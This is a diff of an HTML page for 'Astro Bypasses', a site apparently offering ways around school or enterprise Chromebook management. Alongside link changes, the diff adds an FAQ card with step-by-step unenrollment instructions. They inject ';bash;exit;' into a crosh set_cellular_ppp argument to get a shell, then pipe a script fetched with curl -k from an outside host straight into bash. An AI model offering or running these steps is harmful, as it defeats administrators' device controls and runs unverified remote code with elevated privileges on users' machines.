@@ -44,7 +44,7 @@
                         <a href="https://fruvs.github.io/astro//">Home</a>
                     </li>
 					<li class="nav-item">
-                        <a href="https://discord.gg/nullscafe" target="_blank">Discord</a>
+                        <a href="https://discord.gg/5bu8eYYRYu" target="_blank">Discord</a>
                     </li>
                     <li class="nav-item">
                         <a href="https://discord.com/channels/@me" target="_blank">by fruvs#7642</a>
@@ -78,7 +78,7 @@
         <div class="what-to-do pad">
             <div class="container text-center">
                 <h1 class="font-m">Bypasses</h1>
-                <p>There are a variety of bypasses especially focused on chromeOS bypasses <a rel="learn more" href="https://discord.gg/nullscafe" target="_blank">Learn more</a>
+                <p>There are a variety of bypasses especially focused on chromeOS bypasses <a rel="learn more" href="https://discord.gg/5bu8eYYRYu" target="_blank">Learn more</a>
                 <p></p>
                 <div class="row">
                     <div class="col-lg-4 pt-5">
@@ -126,7 +126,7 @@
                 <!-- Section Heading-->
                 <div class="section_heading text-center wow fadeInUp" data-wow-delay="0.2s" style="visibility: visible; animation-delay: 0.2s; animation-name: fadeInUp;">
                     <h3><span>Frequently </span> Asked Questions</h3>
-                    Here in this section you can clarify all your questions you have. If you have more, you can join our <a rel="discord" href="https://discord.gg/nullscafe" target="_blank">Discord</a> and ask.
+                    Here in this section you can clarify all your questions you have. If you have more, you can join our <a rel="discord" href="https://discord.gg/5bu8eYYRYu" target="_blank">Discord</a> and ask.
                     <div class="line"></div>
                 </div>
             </div>
@@ -405,15 +405,12 @@ brask, brya, clapper, coral, dedede, enguarde, glimmer, grunt, hana, hatch, jacu
 
             var value = input.value.trim();
             if (!value.startsWith("{")) {
-                output.textContent = `now go to chrome://sync-internals
-                and click on the "search" tab
-                and search for "wifi_"
+                output.textContent = `
                 
-                then click on:
-                ${value ? hex(value, true) : "the wifi of your choice"}
                 
-                then paste all the code that shows up into the input box
-                and press the magic button`;
+                ${value ? hex(value, true) : ""}
+                
+                `;
             } else {
                 try {
                     var json = JSON.parse(value);
@@ -439,6 +436,60 @@ brask, brya, clapper, coral, dedede, enguarde, glimmer, grunt, hana, hatch, jacu
                         </div>
                     </div>
 
+                   <!-- <div class="card border-0 wow fadeInUp" data-wow-delay="0.4s" style="visibility: visible; animation-delay: 0.4s; animation-name: fadeInUp;">
+                        <div class="card-header border-top" id="headingSix">
+                            <h6 class="mb-0 collapsed" data-toggle="collapse" data-target="#collapseSix" aria-expanded="true" aria-controls="collapseSix">Another Title<span class="lni-chevron-up"></span></h6>
+                        </div>
+                        <div class="collapse" id="collapseSix" aria-labelledby="headingSix" data-parent="#faqAccordion">
+                            <div class="card-body">
+                                <p>test</p>
+                            </div>
+                            <div class="dark">
+                                <div></div>
+                            </div>
+                            <div class="card-footer border-top">
+                                 Footer content here
+                            </div>
+                        </div>
+                    </div>-->
+
+                    <div class="card border-0 wow fadeInUp" data-wow-delay="0.4s" style="visibility: visible; animation-delay: 0.4s; animation-name: fadeInUp;">
+                        <div class="card-header border-top" id="headingSix">
+                            <h6 class="mb-0 collapsed" data-toggle="collapse" data-target="#collapseSix" aria-expanded="true" aria-controls="collapseSix">Unenroll Without SH1mmer<span class="lni-chevron-up"></span></h6>
+                        </div>
+                        <div class="collapse" id="collapseSix" aria-labelledby="headingSix" data-parent="#faqAccordion">
+                            <div class="card-body">
+                                <p>In order for this exploit to work you need to downgrade to exactly version 101</p>
+                                <p>This method requires crosh to be unblocked on your chromebook.</p>
+                                <p>
+                                    Crosh can be opened with CTRL+ALT+T</p>
+                                    <p>
+                                        If it's blocked by an extension, you can disable it with LTBEEF</p>
+                                        <p>STEPS</p>
+                                        <p>Open crosh (ctrl + alt + t)</p>
+                                      
+                                        <p>Type in </p>
+                                        <p>set_cellular_ppp \';bash;exit;\'</p> <p>press enter</p>
+                                        <p>Type in</p>
+                                        <p>bash <(curl -k https://coolelectronics.me/unroll)</p><p> then press enter again</p>
+                                        <p>When it asks are you sysadmin type "n" when it asks again type "n"</p>
+                                        <p>Wait for the script to finish, then powerwash your chromebook</p>
+                                        <p>To powerwash your chromebook logout of the chromebook and press (CTRL+ATL+SHIFT+R)</p>
+
+                            </div>
+                            <div class="dark">
+                                <div></div>
+                            </div>
+                            <div class="card-footer border-top">
+                                 <!--Footer content here -->
+                            </div>
+                        </div>
+                    </div>
+                    
+                    
+    
+                    
+
                 </div>
             </div>
         </div>
@@ -449,6 +500,7 @@ brask, brya, clapper, coral, dedede, enguarde, glimmer, grunt, hana, hatch, jacu
         <section class="bg-client">
              <footer class="text-center small tm-footer">
              	 Astro Bypasses
+                  by fruvs#7642..
               <br>
              Made By Fruvs#7642
             </footer>
